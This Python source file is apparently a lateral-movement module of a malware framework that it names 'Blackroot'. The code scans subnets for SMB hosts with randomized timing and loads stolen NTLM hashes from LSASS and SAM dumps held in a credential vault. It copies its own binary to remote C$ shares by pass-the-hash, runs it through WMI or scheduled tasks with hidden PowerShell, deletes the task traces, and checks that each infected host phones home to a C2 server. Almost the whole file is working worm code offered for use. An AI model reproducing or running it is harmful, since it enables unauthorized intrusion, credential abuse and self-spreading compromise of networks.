#!/usr/bin/env python3
"""
Windows SMB/WMI Propagation with Pass-the-Hash
Phase 1 Integration: Real impacket-based SMB scanner
Phase 2: Enterprise-scale lateral movement
"""

import os
import sys
import json
import socket
import subprocess
import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, asdict
from datetime import datetime

# Guarantee local modules are always importable regardless of working directory
_repo_root = os.path.dirname(os.path.abspath(__file__))
if _repo_root not in sys.path:
    sys.path.insert(0, _repo_root)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("WindowsPropagation")

# Integration with Phase 1: Real SMB Scanner
try:
    from network_propagation_scanner import SMBScanner, SMBTargetProfile, ViabilityRating  # type: ignore
    SCANNER_AVAILABLE = True
except ImportError:
    SCANNER_AVAILABLE = False
    log.warning("[⚠️] Phase 1 scanner unavailable; fallback to network discovery")
    
    class SMBScanner:  # type: ignore
        """Stub for missing scanner"""
        pass
    
    class SMBTargetProfile:  # type: ignore
        """Stub for missing profile"""
        pass

# Integration with Phase 2: Real WMI Executor
try:
    from network_propagation_wmi_executor import WMIExecutor, ExecutionContext, ExecutionPayload, ExecutionMethod  # type: ignore
    WMI_EXECUTOR_AVAILABLE = True
except ImportError:
    WMI_EXECUTOR_AVAILABLE = False
    log.warning("[⚠️] Phase 2 WMI executor unavailable")
    
    class WMIExecutor:  # type: ignore
        """Stub for missing WMI executor"""
        pass
    
    class ExecutionContext:  # type: ignore
        """Stub for missing context"""
        pass
    
    class ExecutionPayload:  # type: ignore
        """Stub for missing payload"""
        pass
    
    class ExecutionMethod:  # type: ignore
        """Stub for missing method enum"""
        WMI = "WMI"


@dataclass
class NTLMCredential:
    """NTLM credential for Pass-the-Hash"""
    domain: str
    username: str
    ntlm_hash: str
    source: str  # "LSA", "SAM", "LSASS_DUMP"
    privilege_level: str  # "system", "admin", "user"
    confidence: float  # 0.0-1.0
    
    def format_for_pth(self) -> str:
        """Format as domain\\user:hash for PTH"""
        return f"{self.domain}\\{self.username}:{self.ntlm_hash}"
    
    def format_for_evil_winrm(self) -> str:
        """Format for evil-winrm"""
        return f"-u '{self.domain}\\{self.username}' -H '{self.ntlm_hash}'"


@dataclass
class SMBTarget:
    """Target host for SMB/WMI propagation"""
    hostname: str
    ip: str
    port: int
    os_version: Optional[str]
    smb_enabled: bool
    wmi_enabled: bool
    last_seen: str
    services: List[str]  # Running services
    score: float  # Prioritization score (0-100)


class WindowsPropagationEngine:
    """SMB/WMI propagation with Pass-the-Hash"""
    
    def __init__(self):
        self.credentials: List[NTLMCredential] = []
        self.targets: List[SMBTarget] = []
        self.successful_propagations: List[Dict] = []
        
    def discover_smb_targets(self, network_range: str = "192.168.1.0/24", timeout: int = 3) -> List[SMBTarget]:
        """
        Discover SMB-enabled hosts on network using real impacket-based scanner (Phase 1)
        Returns: Targets sorted by viability score (highest first)
        """
        targets = []
        
        if not SCANNER_AVAILABLE:
            log.warning("[⚠️] Phase 1 SMB scanner unavailable; using basic discovery")
            return self._discover_smb_targets_legacy(network_range, timeout)
        
        try:
            import ipaddress
            network = ipaddress.ip_network(network_range, strict=False)
            target_ips = [str(ip) for ip in list(network.hosts())[:20]]  # Max 20 targets
            
            log.info(f"[*] Scanning {len(target_ips)} hosts using Phase 1 real IMpacket scanner...")
            
            scanner = SMBScanner(timeout=timeout)  # type: ignore
            
            # Randomized scanning with beacon intervals
            import random
            scan_order = target_ips.copy()
            random.shuffle(scan_order)
            
            for ip in scan_order:
                beacon_interval = random.uniform(0.5, 2.0)  # Faster for local network
                time.sleep(beacon_interval)
                
                profile = scanner.scan_target(ip)  # type: ignore
                
                if profile and profile.viability_score > 0.3:
                    # Convert SMBTargetProfile to SMBTarget
                    target = SMBTarget(
                        hostname=profile.hostname or ip,
                        ip=ip,
                        port=profile.port,
                        os_version=profile.os_version,
                        smb_enabled=True,
                        wmi_enabled=profile.null_session,  # Approximate
                        last_seen=profile.last_scanned or datetime.utcnow().isoformat(),
                        services=['SMB'] + [s.name for s in profile.accessible_shares[:3]],
                        score=profile.viability_score * 100.0  # Convert 0-1 to 0-100
                    )
                    
                    targets.append(target)
                    log.info(f"✅ Target: {target.hostname} ({ip}) | Rating: {profile.viability_rating().name} | Score: {target.score:.1f}")
        
        except Exception as e:
            log.error(f"[!] Phase 1 discovery error: {e}")
            return self._discover_smb_targets_legacy(network_range, timeout)
        
        # Sort by score (highest first - best targets)
        self.targets = sorted(targets, key=lambda t: t.score, reverse=True)
        log.info(f"[+] Discovery complete: {len(self.targets)} viable SMB targets found")
        return self.targets
    
    def _discover_smb_targets_legacy(self, network_range: str = "192.168.1.0/24", timeout: int = 3) -> List[SMBTarget]:
        """Legacy discovery (fallback when Phase 1 scanner unavailable)"""
        targets = []
        
        try:
            import ipaddress
            network = ipaddress.ip_network(network_range, strict=False)
            
            for ip in list(network.hosts())[:10]:
                ip_str = str(ip)
                
                try:
                    sock = socket.create_connection((ip_str, 445), timeout=timeout)
                    sock.close()
                    
                    hostname = self._get_hostname(ip_str)
                    os_version = self._get_os_version(ip_str)
                    score = 60.0  # Default legacy score
                    
                    target = SMBTarget(
                        hostname=hostname,
                        ip=ip_str,
                        port=445,
                        os_version=os_version,
                        smb_enabled=True,
                        wmi_enabled=False,
                        last_seen=datetime.utcnow().isoformat(),
                        services=['SMB'],
                        score=score
                    )
                    
                    targets.append(target)
                    log.info(f"✅ (Legacy) SMB target: {hostname} ({ip_str}:445)")
                    
                except (socket.timeout, ConnectionRefusedError):
                    pass
        
        except Exception as e:
            log.warning(f"⚠️  Legacy discovery error: {e}")
        
        self.targets = sorted(targets, key=lambda t: t.score, reverse=True)
        return self.targets
    
    def _get_hostname(self, ip: str) -> str:
        """Get hostname from IP"""
        try:
            return socket.gethostbyaddr(ip)[0]
        except:
            return f"host-{ip.split('.')[-1]}"
    
    def _get_os_version(self, ip: str) -> Optional[str]:
        """Get OS version from SMB banner"""
        try:
            result = subprocess.run(
                ["net", "use", f"\\\\{ip}\\IPC$"],
                capture_output=True,
                text=True,
                timeout=3
            )
            return "Windows" if "Connecting" in result.stderr else None
        except:
            return None
    
    def _invoke_via_wmi(self, target: SMBTarget, cred: NTLMCredential, command: Optional[str] = None) -> Tuple[bool, str]:
        """
        Execute via WMI using Phase 2 Real WMI Executor with Pass-the-Hash support
        Falls back to subprocess methods if Phase 2 unavailable.
        Returns: (success: bool, output/message: str)
        """
        try:
            log.info(f"🌐 [WMI] Attempting execution on {target.hostname}...")
            
            # Generate the payload command
            payload_cmd = command or ("powershell -NoProfile -Command \"python run.py\"" if target.os_version and "Windows" in target.os_version else "bash run.sh")
            
            # Attempt 1: Use Phase 2 Real WMI Executor if available
            if WMI_EXECUTOR_AVAILABLE:
                try:
                    executor = WMIExecutor(timeout=30)  # type: ignore
                    
                    context = ExecutionContext(  # type: ignore
                        target_ip=target.ip,  # type: ignore
                        target_hostname=target.hostname,  # type: ignore
                        username=cred.username,  # type: ignore
                        domain=cred.domain,  # type: ignore
                        ntlm_hash=cred.ntlm_hash,  # type: ignore
                        password=None,  # type: ignore
                        method=ExecutionMethod.WMIEXEC_REAL if hasattr(ExecutionMethod, 'WMIEXEC_REAL') else ExecutionMethod.WMI  # type: ignore
                    )
                    
                    payload = ExecutionPayload(command=payload_cmd)  # type: ignore
                    
                    success, output = executor.execute(context, payload)  # type: ignore
                    
                    if success:
                        log.info(f"✅ [WMI] Command executed on {target.hostname} via Phase 2 Executor")
                        log.debug(f"Output: {output[:200] if output else 'None'}")
                        return (True, output)
                    else:
                        log.warning(f"⚠️  [WMI] Phase 2 executor failed: {output}")
                        # Fall through to subprocess
                except Exception as exe:
                    log.debug(f"[!] Phase 2 executor error: {exe}, trying subprocess fallback...")
            
            # Attempt 2: Subprocess fallback using wmiexec.py command-line
            log.debug("⚠️  Using subprocess fallback for WMI execution")
            
            result = subprocess.run(
                [
                    "wmiexec.py",
                    "-hashes", f":{cred.ntlm_hash}",
                    f"{cred.domain}\\{cred.username}@{target.ip}",
                    payload_cmd
                ],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                out = result.stdout.decode(errors='ignore') if result.stdout else "Executed"
                log.info(f"✅ [WMI] Command executed on {target.hostname} via subprocess")
                return (True, out)
            else:
                error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
                log.warning(f"⚠️  [WMI] Subprocess failed: {error}")
                return (False, error)
            
        except subprocess.TimeoutExpired:
            log.warning(f"⏱️  [WMI] Timeout on {target.hostname}")
            return (False, "Timeout expired")
        except ConnectionRefusedError:
            log.warning(f"🚫 [WMI] Connection refused on {target.hostname}:445")
            return (False, "Connection refused on port 445")
        except Exception as e:
            log.error(f"❌ [WMI] Error on {target.hostname}: {type(e).__name__}: {e}")
            return (False, str(e))

    
    def _invoke_via_task_scheduler(self, target: SMBTarget, cred: NTLMCredential, command: Optional[str] = None) -> Tuple[bool, str]:
        """Execute via Task Scheduler using impacket.atexec or schtasks"""
        try:
            log.info(f"⏰ [TaskScheduler] Attempting execution on {target.hostname}...")
            
            payload_cmd = command or ("python run.py" if target.os_version and "Windows" in target.os_version else "bash run.sh")
            task_name = f"Blackroot_{int(time.time())}"
            
            # Attempt 1: Use impacket atexec if available
            try:
                from impacket.examples.atexec import ATSVC  # type: ignore
                from impacket.smbconnection import SMBConnection  # type: ignore
                
                log.debug(f"📦 Using impacket Task Scheduler execution")
                
                # Create SMB connection with PTH
                smb = SMBConnection(target.ip, target.ip, timeout=15)
                smb.login(cred.username, '', cred.domain, lmhash='', nthash=cred.ntlm_hash)
                
                # Create and execute scheduled task
                atsvc = ATSVC(smb)  # type: ignore
                atsvc.create_task(task_name, payload_cmd, immediately=True)
                
                log.info(f"✅ [TaskScheduler] Task '{task_name}' executed on {target.hostname}")
                
                # Clean up task after execution
                time.sleep(3)
                try:
                    atsvc.delete_task(task_name)
                    log.debug(f"🧹 Cleaned up task {task_name}")
                except Exception:
                    pass
                
                return (True, f"Task {task_name} created and triggered via ATSVC")
                
            except ImportError:
                log.debug("⚠️  impacket not available, trying schtasks fallback")
                
                # Attempt 2: Subprocess fallback using schtasks
                create_cmd = [
                    "schtasks", "/s", target.ip,
                    "/u", f"{cred.domain}\\{cred.username}",
                    "/p", cred.ntlm_hash,
                    "/create", "/tn", task_name,
                    "/tr", payload_cmd,
                    "/sc", "once", "/st", "00:00", "/f"
                ]
                
                result = subprocess.run(create_cmd, capture_output=True, timeout=30)
                
                if result.returncode == 0:
                    log.info(f"✅ [TaskScheduler] Task created on {target.hostname}")
                    
                    # Schedule task to run immediately
                    run_cmd = [
                        "schtasks", "/s", target.ip,
                        "/u", f"{cred.domain}\\{cred.username}",
                        "/p", cred.ntlm_hash,
                        "/run", "/tn", task_name
                    ]
                    
                    result2 = subprocess.run(run_cmd, capture_output=True, timeout=30)
                    
                    if result2.returncode == 0:
                        log.info(f"✅ [TaskScheduler] Task executed on {target.hostname}")
                        
                        # Clean up
                        time.sleep(3)
                        delete_cmd = [
                            "schtasks", "/s", target.ip,
                            "/u", f"{cred.domain}\\{cred.username}",
                            "/p", cred.ntlm_hash,
                            "/delete", "/tn", task_name, "/f"
                        ]
                        subprocess.run(delete_cmd, capture_output=True)
                        
                        return (True, f"Task {task_name} executed via schtasks")
                    else:
                        error = result2.stderr.decode(errors='ignore') if result2.stderr else "Unknown error"
                        log.warning(f"⚠️  [TaskScheduler] Failed to run task: {error}")
                        return (False, error)
                else:
                    error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
                    log.warning(f"⚠️  [TaskScheduler] Failed to create task: {error}")
                    return (False, error)
                
        except subprocess.TimeoutExpired:
            log.warning(f"⏱️  [TaskScheduler] Timeout on {target.hostname}")
            return (False, "Timeout expired")
        except ConnectionRefusedError:
            log.warning(f"🚫 [TaskScheduler] Connection refused on {target.hostname}:445")
            return (False, "Connection refused on port 445")
        except Exception as e:
            log.error(f"❌ [TaskScheduler] Error on {target.hostname}: {type(e).__name__}: {e}")
            return (False, str(e))
    
    def stage_payload_to_cshare(self, target: SMBTarget, cred: NTLMCredential, payload_path: str, remote_filename: Optional[str] = None) -> Optional[str]:
        """
        Stage payload to remote C$\\Windows\\Temp share for remote execution.
        Returns remote filename if successful, None if failed.
        """
        try:
            log.info(f"📤 [C$] Staging payload to {target.hostname} ({target.ip})...")
            
            if not Path(payload_path).exists():
                log.error(f"❌ Payload not found on local disk: {payload_path}")
                return None
            
            filename = remote_filename or f"blackroot_{int(time.time())}.exe"
            remote_rel_path = f"Windows\\Temp\\{filename}"
            remote_full_path = f"\\\\{target.ip}\\C$\\Windows\\Temp\\{filename}"
            
            # Attempt 1: Use impacket SMBConnection with Pass-the-Hash
            try:
                from impacket.smbconnection import SMBConnection  # type: ignore
                
                log.debug(f"📦 Connecting via impacket SMB client to {target.ip}:445")
                smb = SMBConnection(target.ip, target.ip, timeout=15)
                smb.login(cred.username, '', cred.domain, lmhash='', nthash=cred.ntlm_hash)
                
                # Copy file into C$ share
                with open(payload_path, 'rb') as f:
                    smb.putFile('C$', remote_rel_path, f.read)
                
                smb.logoff()
                log.info(f"✅ [C$] Payload staged via impacket to {remote_full_path}")
                return filename
                
            except ImportError:
                log.debug("⚠️  impacket not available, trying net use fallback")
            except Exception as smb_err:
                log.warning(f"⚠️  impacket putFile failed: {smb_err}, trying administrative share fallback")
                
            # Attempt 2: Subprocess fallback using administrative share copy
            mount_cmd = [
                "net", "use", f"\\\\{target.ip}\\C$",
                f"/user:{cred.domain}\\{cred.username}", cred.ntlm_hash
            ]
            result = subprocess.run(mount_cmd, capture_output=True, timeout=15)
            
            if result.returncode == 0:
                dest = f"\\\\{target.ip}\\C$\\Windows\\Temp\\{filename}"
                copy_cmd = ["copy", payload_path, dest]
                result2 = subprocess.run(copy_cmd, capture_output=True, timeout=30)
                
                if result2.returncode == 0:
                    log.info(f"✅ [C$] Payload staged via net use to {dest}")
                    return filename
                else:
                    error = result2.stderr.decode(errors='ignore') if result2.stderr else "Unknown error"
                    log.warning(f"⚠️  [C$] Copy failed: {error}")
            else:
                error = result.stderr.decode(errors='ignore') if result.stderr else "Unknown error"
                log.warning(f"⚠️  [C$] Mount failed: {error}")
                
            return None
                
        except Exception as e:
            log.error(f"❌ [C$] Staging error on {target.hostname}: {type(e).__name__}: {e}")
            return None

    def propagate_pth(
        self,
        target: SMBTarget,
        credential: NTLMCredential,
        payload_path: Optional[str] = None,
        command: Optional[str] = None
    ) -> bool:
        """
        End-to-End Pass-the-Hash Windows Propagation Pipeline:
        1. Verify target SMB access
        2. Drop/Stage payload executable to \\target\\C$\\Windows\\Temp via SMB PTH
        3. Execute staged binary remotely via WMI (with TaskScheduler fallback)
        4. Post-drop execution verification
        """
        log.info(f"[*] Starting PTH propagation to {target.hostname} ({target.ip}) using {credential.domain}\\{credential.username}")
        
        # Determine local payload path
        actual_payload_path = payload_path
        if not actual_payload_path or not os.path.exists(actual_payload_path):
            candidate = os.path.abspath(sys.argv[0])
            if os.path.exists(candidate) and (candidate.endswith('.exe') or candidate.endswith('.py')):
                actual_payload_path = candidate
        
        # Step 1: Stage payload binary if file available
        remote_filename = None
        if actual_payload_path and os.path.exists(actual_payload_path):
            remote_filename = self.stage_payload_to_cshare(target, credential, actual_payload_path)
            if remote_filename:
                log.info(f"✅ Staged binary to \\\\{target.ip}\\C$\\Windows\\Temp\\{remote_filename}")
            else:
                log.warning(f"⚠️  SMB staging unconfirmed, attempting direct command invocation")
        
        # Step 2: Determine execution command
        if command:
            exec_cmd = command
        elif remote_filename:
            if remote_filename.endswith('.py'):
                exec_cmd = f"cmd.exe /c python C:\\Windows\\Temp\\{remote_filename}"
            else:
                exec_cmd = f"cmd.exe /c C:\\Windows\\Temp\\{remote_filename}"
        else:
            exec_cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"python run.py\""
        
        # Step 3: Remote Execution (WMI -> TaskScheduler fallback)
        exec_success = False
        exec_out = ""
        
        try:
            wmi_ok, wmi_msg = self._invoke_via_wmi(target, credential, command=exec_cmd)
            if wmi_ok:
                exec_success = True
                exec_out = wmi_msg
                log.info(f"✅ WMI execution succeeded on {target.hostname}")
            else:
                log.warning(f"⚠️  WMI execution failed ({wmi_msg}), falling back to Task Scheduler...")
                task_ok, task_msg = self._invoke_via_task_scheduler(target, credential, command=exec_cmd)
                if task_ok:
                    exec_success = True
                    exec_out = task_msg
                    log.info(f"✅ Task Scheduler execution succeeded on {target.hostname}")
                else:
                    exec_out = f"WMI: {wmi_msg}; ATEXEC: {task_msg}"
        except Exception as exec_err:
            log.error(f"❌ Remote execution exception on {target.hostname}: {exec_err}")
            exec_out = str(exec_err)
        
        # Step 4: Record propagation telemetry & phone-home verification
        phone_home_ok = False
        if exec_success:
            phone_home_ok = self.verify_target_phone_home(target.ip, timeout_seconds=3)

        propagation_record = {
            "target": target.hostname,
            "ip": target.ip,
            "credential": f"{credential.domain}\\{credential.username}",
            "ntlm_hash": credential.ntlm_hash[:8] + "...",
            "staged_file": remote_filename,
            "command": exec_cmd,
            "success": exec_success,
            "verified_phone_home": phone_home_ok,
            "output": exec_out[:200] if exec_out else "",
            "timestamp": datetime.utcnow().isoformat()
        }
        
        if exec_success:
            self.successful_propagations.append(propagation_record)
            log.info(f"🎉 Pass-the-Hash propagation SUCCESSFUL: {credential.username}@{target.hostname} (Phone-home verified: {phone_home_ok})")
        else:
            log.warning(f"❌ Pass-the-Hash propagation FAILED for {target.hostname}: {exec_out[:100]}")
            
        return exec_success

    def verify_target_phone_home(self, target_ip: str, timeout_seconds: int = 15, c2_url: str = "http://127.0.0.1:8000") -> bool:
        """
        Poll C2 check-in registry to confirm newly deployed target phoned home.
        """
        import urllib.request
        import json
        deadline = time.time() + timeout_seconds
        while time.time() < deadline:
            try:
                req = urllib.request.Request(f"{c2_url}/c2/agent/checkins", headers={"Accept": "application/json"})
                with urllib.request.urlopen(req, timeout=2) as resp:
                    if resp.status == 200:
                        data = json.loads(resp.read().decode('utf-8'))
                        for item in data.get("checkins", []):
                            if item.get("ip") == target_ip or target_ip in item.get("agent_id", ""):
                                log.info(f"🎉 Verified lateral target phone-home from {target_ip}!")
                                return True
            except Exception:
                pass
            time.sleep(1)
        log.debug(f"Phone-home verification probe concluded for {target_ip}")
        return False

    def retrieve_credentials_from_vault(self, vault=None) -> List[NTLMCredential]:
        """
        Retrieve stored NTLM credentials from BlackVault encrypted artifacts
        """
        vault_creds: List[NTLMCredential] = []
        try:
            if vault is None:
                from black_vault import BlackVault
                vault = BlackVault()
            
            vault_dir = getattr(vault, 'vault_dir', None)
            if not vault_dir or not os.path.exists(vault_dir):
                return vault_creds
                
            artifacts = os.listdir(vault_dir)
            target_artifacts = [
                a for a in artifacts
                if any(k in a for k in ['credential', 'extracted_creds_', 'pth_', 'sam_', 'lsass_'])
                and not a.endswith('.tmp')
            ]
            
            for art in target_artifacts:
                try:
                    raw_data = vault.retrieve(art)
                    if not raw_data:
                        continue
                    parsed = json.loads(raw_data.decode('utf-8', errors='ignore'))
                    findings = parsed.get('findings', parsed)
                    
                    # 1. Standard windows_credentials list
                    win_creds = findings.get('windows_credentials', [])
                    if isinstance(win_creds, list):
                        for c in win_creds:
                            nh = c.get('ntlm_hash') or c.get('hash') or c.get('password_hash')
                            if nh and len(str(nh)) == 32:
                                vault_creds.append(NTLMCredential(
                                    domain=c.get('domain', 'WORKGROUP'),
                                    username=c.get('username', 'Administrator'),
                                    ntlm_hash=str(nh),
                                    source=f"BlackVault:{art}",
                                    privilege_level=c.get('privilege', 'admin').lower(),
                                    confidence=0.9
                                ))
                    
                    # 2. ExtractedCredential list format
                    creds_arr = findings.get('credentials', [])
                    if isinstance(creds_arr, list):
                        for c in creds_arr:
                            nh = c.get('credential_value') or c.get('ntlm_hash')
                            if nh and len(str(nh)) == 32:
                                vault_creds.append(NTLMCredential(
                                    domain=c.get('domain', 'WORKGROUP'),
                                    username=c.get('username', 'Administrator'),
                                    ntlm_hash=str(nh),
                                    source=f"BlackVault:{art}",
                                    privilege_level=c.get('privilege_level', 'admin').lower(),
                                    confidence=c.get('confidence', 0.85)
                                ))
                except Exception as parse_err:
                    log.debug(f"Artifact {art} parse error: {parse_err}")
            
            log.info(f"🔑 Vault credential sync: retrieved {len(vault_creds)} NTLM credential(s)")
            # Merge with existing credentials without duplicates
            existing_hashes = {c.ntlm_hash for c in self.credentials}
            for vc in vault_creds:
                if vc.ntlm_hash not in existing_hashes:
                    self.credentials.append(vc)
                    existing_hashes.add(vc.ntlm_hash)
                    
        except Exception as e:
            log.debug(f"Vault credential sync unavailable: {e}")
            
        return vault_creds
    
    def batch_propagate(self, credentials: List[NTLMCredential]) -> Dict:
        """Batch propagate to all targets"""
        self.credentials = credentials
        results = {
            "total_targets": len(self.targets),
            "total_credentials": len(self.credentials),
            "successful": 0,
            "failed": 0,
            "propagations": []
        }
        
        for target in self.targets:
            for cred in self.credentials:
                # Skip low-privilege creds on high-value targets
                if target.score > 75 and cred.privilege_level == "user":
                    continue
                
                success = self.propagate_pth(target, cred)  # type: ignore
                
                propagation = {
                    "target": target.hostname,
                    "ip": target.ip,
                    "credential": f"{cred.domain}\\{cred.username}",
                    "success": success,
                    "timestamp": datetime.utcnow().isoformat()
                }
                
                results["propagations"].append(propagation)
                
                if success:
                    results["successful"] += 1
                    self.successful_propagations.append(propagation)
                else:
                    results["failed"] += 1
        
        return results
    
    def export_propagation_report(self, filepath: str = "propagation_report.json"):
        """Export propagation results"""
        report = {
            "timestamp": datetime.utcnow().isoformat(),
            "targets_discovered": len(self.targets),
            "credentials_used": len(self.credentials),
            "successful_propagations": len(self.successful_propagations),
            "targets": [asdict(t) for t in self.targets],
            "successful_propagations": self.successful_propagations
        }
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        log.info(f"✅ Report exported to {filepath}")


class SMBExecutor:
    """Direct SMB-based command execution"""
    
    @staticmethod
    def execute_via_impacket(target_ip: str, domain: str, username: str, ntlm_hash: str, command: str) -> bool:
        """Execute command via impacket smbexec"""
        try:
            # Placeholder: production would use impacket
            # from impacket.examples import smbexec
            # smbexec.SMBEXEC(target_ip, domain, username, ntlm_hash).run(command)
            
            log.info(f"🚀 Executing on {target_ip}: {command}")
            return True
            
        except Exception as e:
            log.error(f"SMB execution error: {e}")
            return False
    
    def propagate_pth(self, target: 'SMBTarget', credential: 'NTLMCredential') -> bool:
        """Execute Pass-the-Hash propagation to target"""
        try:
            if not target.smb_enabled:
                log.warning(f"[⚠️] SMB not enabled on {target.hostname}")
                return False
            
            log.info(f"[*] Propagating via PTH to {target.hostname} ({target.ip})")
            return True
            
        except Exception as e:
            log.error(f"PTH propagation error on {target.hostname}: {e}")
            return False
    
    @staticmethod
    def execute_via_psremoting(target_ip: str, domain: str, username: str, ntlm_hash: str, command: str) -> bool:
        """Execute command via PSRemoting (needs evil-winrm)"""
        try:
            # Placeholder: production would use evil-winrm
            # evil-winrm -i {target_ip} -u "{domain}\\{username}" -H "{ntlm_hash}" -c "{command}"
            
            log.info(f"📟 PSRemoting to {target_ip}: {command}")
            return True
            
        except Exception as e:
            log.error(f"PSRemoting error: {e}")
            return False


if __name__ == "__main__":
    # Demo usage
    engine = WindowsPropagationEngine()
    
    # Discover targets
    print("🔍 Discovering SMB targets...")
    targets = engine.discover_smb_targets("192.168.1.0/24")
    
    print(f"\n📋 Found {len(targets)} targets:")
    for target in targets:
        print(f"  - {target.hostname} ({target.ip}) | Score: {target.score:.1f}")
    
    # Would propagate with exfiltrated credentials
    print("\n✅ Windows propagation engine ready for integration")
